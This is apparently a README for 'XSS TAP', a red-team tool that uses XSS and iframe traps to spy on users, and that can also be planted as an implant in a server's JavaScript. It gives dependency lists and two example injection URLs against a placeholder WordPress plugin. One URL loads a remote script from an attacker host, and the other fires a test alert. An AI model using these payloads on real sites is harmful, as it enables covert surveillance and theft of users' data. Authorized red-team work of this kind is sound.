# XSS TAP
Tailored XSS payload that uses iFrame traps to spy on user. Intended for redteam ops. 
@hoodoer

Ok, this is getting refactored into both an iframe trap payload, and an implant
that can be dropped into an application server's javascript files. 

This tool is intended to be used on systems you are authorized to attack.
Do not use this tool for illegal purposes, or I will be very angry in your general direction. 
@hoodoer


Pip requirements: 

Server ones:
flask
flask-cors
pyopenssl

Generator ones:
dataframe_image
fpdf
progressbar


HTML Parser:
bs4





https://targetapp.possiblymalware.com/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%20src=%27https://localhost:8444/lib/telemlib.js%27%3E%3C/script%3E


https://targetapp.possiblymalware.com/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E

